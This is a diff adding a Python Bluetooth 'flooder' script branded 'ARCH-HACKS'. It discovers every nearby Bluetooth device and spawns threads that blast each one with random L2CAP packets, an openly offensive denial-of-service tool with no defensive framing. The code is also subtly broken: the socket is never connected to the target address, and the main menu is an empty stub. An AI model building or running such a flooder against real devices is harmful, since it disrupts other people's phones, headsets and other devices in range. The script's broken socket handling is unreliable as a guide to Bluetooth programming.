@@ -1,0 +1,41 @@
+#!/usr/bin/env python3
+import bluetooth, socket, struct, time, random, threading, sys, os
+from rich.console import Console
+from rich.table import Table
+
+console = Console()
+
+class BluetoothFlooder:
+    def __init__(self):
+        self.running = False
+        self.threads = []
+        self.stats = {'packets_sent': 0, 'devices_found': 0, 'errors': 0}
+        self.targets = []
+        
+    def discover_devices(self, duration=8):
+        devices = bluetooth.discover_devices(duration=duration, lookup_names=True, flush_cache=True)
+        self.targets = [{'mac': addr, 'name': name if name else 'Desconocido'} for addr, name in devices]
+        return devices
+
+    def flood_device(self, target_mac):
+        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+        while self.running:
+            try:
+                sock.send(os.urandom(random.randint(50, 200)))
+                self.stats['packets_sent'] += 1
+            except:
+                self.stats['errors'] += 1
+                time.sleep(0.01)
+
+    def start_flood(self):
+        self.running = True
+        for target in self.targets:
+            t = threading.Thread(target=self.flood_device, args=(target['mac'],))
+            t.daemon = True
+            t.start()
+
+if __name__ == "__main__":
+    # Menú rápido
+    f = BluetoothFlooder()
+    print("⚡ ARCH-HACKS Cargado ⚡")
+    # Lógica de ejecución aquí
